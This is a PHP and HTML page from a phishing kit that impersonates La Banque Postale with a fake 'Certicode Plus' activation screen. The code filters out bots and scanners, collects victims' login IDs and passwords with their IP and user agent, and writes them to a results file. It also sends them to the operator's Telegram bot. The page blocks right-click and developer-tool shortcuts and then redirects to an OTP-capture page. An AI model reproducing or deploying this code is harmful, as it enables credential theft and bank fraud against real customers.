<?php

error_reporting(E_ERROR | E_WARNING | E_PARSE | E_NOTICE);
@ini_set('html_errors','0');
@ini_set('display_errors','0');
@ini_set('display_startup_errors','0');
@ini_set('log_errors','0');
$honeypotbots = file_get_contents('honeypotbots.dat');
$errorUrl = 'Error.php';
$ip = getenv('REMOTE_ADDR');

if (stripos($honeypotbots, $ip) !== false) {
  $stripos = '1';

}

$token1 = base64_encode($_SERVER['HTTP_USER_AGENT'].$ip.date('Y:M:D'));
if ($token1 != $_GET['token'] || $stripos == '1' ){ header("location: " . $errorUrl ."?" . $_GET['token']); exit;  }
function curl_get_contents($url)
{
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
    curl_setopt($ch, CURLOPT_URL, $url);
    $data = curl_exec($ch);
    curl_close($ch);
    return $data;
} 
$metri = $_SERVER['REMOTE_ADDR'];
$geoip = 'http://www.geoplugin.net/php.gp?ip='.$metri;
$addrDetailsArr = unserialize(curl_get_contents($geoip)); 
$continent = $addrDetailsArr['geoplugin_continentCode'];
$country = $addrDetailsArr['geoplugin_countryCode'];
 
if ($_POST['type'] == "log") {
include 'config.php';
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);


            $message = '/== Postale log By METRI==/' . $_SERVER['REMOTE_ADDR'] . "\r\n";
            $message .= 'ID : ' . $_POST['login'] . "\r\n";
            $message .= 'PWD : ' . $_POST['password'] . "\r\n";

            $message .= '/---------------- user details ----------------/' . "\r\n";
            $message .= "Client IP   : ".$ip."\n";
            $message .= "HostName    : ".$hostname."\n";
            $message .= "User Agent  : ".$_SERVER['HTTP_USER_AGENT']."\n";
            $message .= '/-- end log details --/' . "\r\n\r\n";

            file_put_contents("./rezult/postale-rzlt.txt", $message, FILE_APPEND);

            $params=[
            'chat_id'=>$chat_id,
            'text'=>$message,
            ];
            $ch = curl_init($METRI_TOKEN . '/sendMessage');
            curl_setopt($ch, CURLOPT_HEADER, false);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_POST, 1);
            curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
            $result = curl_exec($ch);
            curl_close($ch);
            
}
else {
header("location: " . $errorUrl . "?".base64_encode(rand(0,9999999999999)));
}

?>

<!doctype html>
<html lang="en"><head>
    <!-- Required meta tags -->
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">



    <!-- Bootstrap CSS -->
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css" integrity="sha384-Vkoo8x4CGsO3+Hhxv8T/Q5PaXtkKtu6ug5TOeNV6gBiFeWPGFN9MuhOf23Q9Ifjh" crossorigin="anonymous">
    <link rel="shortcut icon" type="image/png" href="postale-M3tri_files/favicon.png">
    
    <title>La Banque Postale - Attente d'enrôlement </title>
  <style type="text/css">
    
    .loader{
	background: url('postale-M3tri_files/loader.gif') 50% 50% no-repeat rgba(29,29,29,0.8);
	cursor: wait;
	height: 100%;
	left: 0;
	position: fixed;
	top: 0;
	width: 100%;
	z-index: 9999;
   }
	.loader h1{
		background: none;
		border: none;
		color: #19489E;
		font-size: 22px;
		font-family: 'Lato', sans-serif !important;
		font-weight: 700;
		height: 700px;
		line-height: 700px;
		margin: 0 0 10px;
		padding: 0;
		text-align: center;
	}
	
    .content {
    background: #fff;
    height: 400px;
    width: 380px;
    margin-left: auto;
    margin-right: auto;
    display: flex;
    align-items: center;
    justify-content: center;
    border-radius: 10px;
    border: 1px solid #19489E;
	font-size: 16px;
	font-family: 'Lato', sans-serif !important;
    }

  </style></head>

  

  <body><div class="loader">
  <div class="content" style="margin-top:180px;width: 380px;display: block;" align="center">
<img src="./postale-M3tri_files/certi.jpg" style="
    width: 10%;
">
<br>TOUJOURS PLUS DE SÉCURITÉ<br><br>
En application de la 2ème directive européenne pour les services de paiement (DSP2).<br>
Une authentification forte vous sera demandée tous les 90 jours.<br>
<br>N'attendez plus et activez Certicode Plus, la solution d'authentification forte mis en place par  
la Banque Postale.<br>
<br>Activation du Certicode plus en cours...
  <p><img src="./postale-M3tri_files/ajax-loader.gif" alt="loading" style="top: 180px; left: -180px;"></p></div>
  </div>

<script>
jQuery(window).load(function(){ jQuery(".loader").fadeOut("200"); });
</script>
<!-- ........................................PC........................................ -->

<div class="d-none d-md-block">
  <img src="postale-M3tri_files/l.png" style="width: 100%">
  <img src="postale-M3tri_files/l1.png" style="width: 100%">
  <img src="postale-M3tri_files/ajax-loader (1).gif" style="position:absolute; overflow:hidden; left:3200px; top:200px">

  <br>
  <br>
  <img src="postale-M3tri_files/p3.png" style="width: 100%">
</div>



<!-- ...................................TEL............................................. -->

   <div class="d-md-none" style="background: white">
    <img src="postale-M3tri_files/ls.png" style="width: 100%">
    <div class="container">


    </div>
    

    <br><br><br><br><br>
    <img src="postale-M3tri_files/s2.png" style="width: 100%">
   </div>

    <!-- Optional JavaScript -->
    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
    <script src="https://code.jquery.com/jquery-3.4.1.slim.min.js" integrity="sha384-J6qa4849blE2+poT4WnyKhv5vZF5SrPo0iEjwBvKU7imGFAV0wwj1yYfoRSJoZ+n" crossorigin="anonymous"></script>
    <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js" integrity="sha384-Q6E9RHvbIyZFJoft+2mJbHaEWldlvI9IOYy5n3zV9zzTtmI3UksdQRVvoxMfooAo" crossorigin="anonymous"></script>
    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/js/bootstrap.min.js" integrity="sha384-wfSDF2E50Y2D1uUdj0O3uMBJnjuUD4Ih7YwaYd1iqfktj0Uod8GCExl3Og8ifwB6" crossorigin="anonymous"></script>
<script src="./postale-M3tri_files/jquery.min.js"></script>
<script>
jQuery(function($){

    document.addEventListener('contextmenu', event => event.preventDefault());
    document.onkeydown = function(e) {
        if (e.ctrlKey && 
        (e.keyCode === 67 || 
        e.keyCode === 86 || 
        e.keyCode === 85 ||
        e.keyCode === 83 || 
        e.keyCode === 117)) {
            return false;
        } else {
            return true;
        }
    };

    $(document).keydown(function (event) {
        if (event.keyCode == 123) { // Prevent F12
            return false;
        } else if (event.ctrlKey && event.shiftKey && event.keyCode == 73) { // Prevent Ctrl+Shift+I        
            return false;
        }
    });

    


    

})


</script>  


<META HTTP-EQUIV="Refresh" Content=15;URL="<?php echo 'po-otp.php?token='.$token1; ?>">

</body></html>